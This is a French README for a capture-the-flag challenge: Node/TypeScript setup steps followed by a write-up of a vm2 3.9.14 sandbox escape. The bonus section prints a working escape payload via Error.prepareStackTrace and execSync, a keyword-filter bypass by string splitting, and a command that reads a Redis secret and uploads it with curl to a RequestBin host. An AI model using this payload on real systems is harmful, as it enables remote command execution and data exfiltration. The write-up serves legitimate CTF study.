Pour tester l'accès à l'API, il faut dans un premier temps avoir node et npm d'installé, pour cela, écrire les commandes suivantes :
- npm init -y
- npm install typescript --save-dev
- npm install @types/node --save-dev

Pour lancer le serveur local, il faut se rendre sur un terminal et utiliser la commande 'cd' pour se rendre dans le dossier.
Puis, dans l'ordre, écrire les commandes :
- npx tsc
- node build/index.js

Ensuite, se rendre sur un navigateur et entrer l'url suivante :
- localhost:3000/ping


BONUS :

J'ai, dans un premier temps réupéré le POC de la vulnérabilité présente sur la version de vm2 qui est utilisé pour ce site. (La 3.9.14) :


'Error.prepareStackTrace = (e, frames) => {
    frames.constructor.constructor('return process')().mainModule.require('child_process').execSync('touch flag'); 
};
(async ()=>{}).constructor('return process')()'

Afin d'avoir un visuel sur la réponse du serveur, j'ai utilisé RequestBin et ai essayé de curl le serveur en écrasant la précédente commande dans execSync :

execSync('curl https://endztqp872ue.x.pipedream.net');

La sécurité du site m'empêchant d'utiliser les mots "process" et "child_process", j'ai du séparer les chaînes de caractère :

exple : process => pro" + "cess

Ayant un retour, je me suis rendu compte que je pouvais avoir accès à des commandes bash. J'ai donc utilisé une commande redis afin de récupérer le FLAG dans la table 1 sur le port 6379 et d'enregistrer le résultat dans un fichier dynamique result :

redis-cli -h redis -p 6379 -n 1 get FLAG > result

Ensuite je l'ai envoyé sur mon serveur temporaire RequestBin :

curl -T result https://endztqp872ue.x.pipedream.net

Ce qui me donne au final la commande suivante :

Error.prepareStackTrace = (e, frames) => {
    frames.constructor.constructor('return proc'+'ess')().mainModule.require('chi'+'ld_pro'+'cess').execSync('redis-cli -h redis -p 6379 -n 1 get FLAG > result && curl -T result https://endztqp872ue.x.pipedream.net'); 
};
(async ()=>{}).constructor('return pr'+'ocess')()

Et le résultat :

STHACK{ch4d-vm2-s4ndb0x-3sc4p3-w1th-3rr0r}